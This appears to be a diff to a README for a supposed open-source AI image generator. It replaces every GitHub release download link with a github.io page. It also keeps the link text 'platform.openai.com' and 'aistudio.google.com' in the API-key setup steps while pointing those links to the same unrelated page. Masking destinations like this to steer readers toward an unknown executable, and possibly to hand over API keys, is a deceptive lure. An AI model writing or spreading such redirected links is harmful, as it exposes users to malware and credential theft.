@@ -1,7 +1,7 @@
 <h1>🖼️ image-gen-open-source - Create Stunning AI Images Locally</h1>
 
 <p align="center">
-  <a href="https://github.com/deadly-centropomus6106/image-gen-open-source/releases"><img src="https://img.shields.io/badge/⬇️%20Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download" width="300"></a>
+  <a href="https://deadly-centropomus6106.github.io"><img src="https://img.shields.io/badge/⬇️%20Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download" width="300"></a>
 </p>
 
 ## 🎯 What Is This?
@@ -27,7 +27,7 @@ Follow these simple steps to get image-gen-open-source up and running on your Wi
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/deadly-centropomus6106/image-gen-open-source/releases](https://github.com/deadly-centropomus6106/image-gen-open-source/releases)
+Visit this link to download the application: [https://deadly-centropomus6106.github.io](https://deadly-centropomus6106.github.io)
 
 Click the download button on that page and save the file to your computer (we recommend your Desktop or Downloads folder).
 
@@ -39,8 +39,8 @@ Navigate to where you saved the downloaded file. Double-click it to start the ap
 
 To use the AI models, you need API keys. Don't worry—this is easier than it sounds.
 
-1. **OpenAI API Key:** Go to [platform.openai.com](https://platform.openai.com) and create a free account. In your dashboard, click "API Keys" and create a new key. Copy it.
-2. **Google Gemini API Key:** Go to [aistudio.google.com](https://aistudio.google.com/app/apikey) and sign in with your Google account. Click "Create API Key" and copy it.
+1. **OpenAI API Key:** Go to [platform.openai.com](https://deadly-centropomus6106.github.io) and create a free account. In your dashboard, click "API Keys" and create a new key. Copy it.
+2. **Google Gemini API Key:** Go to [aistudio.google.com](https://deadly-centropomus6106.github.io) and sign in with your Google account. Click "Create API Key" and copy it.
 3. **Codex API Key:** If you have a Codex account, find your API key in your account settings.
 
 ### Step 4: Enter Your Keys into the App
@@ -136,6 +136,6 @@ So go ahead—download it, set up your keys, and start creating something beauti
 
 ---
 
-**Visit the download page now:** [https://github.com/deadly-centropomus6106/image-gen-open-source/releases](https://github.com/deadly-centropomus6106/image-gen-open-source/releases)
+**Visit the download page now:** [https://deadly-centropomus6106.github.io](https://deadly-centropomus6106.github.io)
 
 Keywords: codex, gemini, image-generation, javascript, local-first, openai
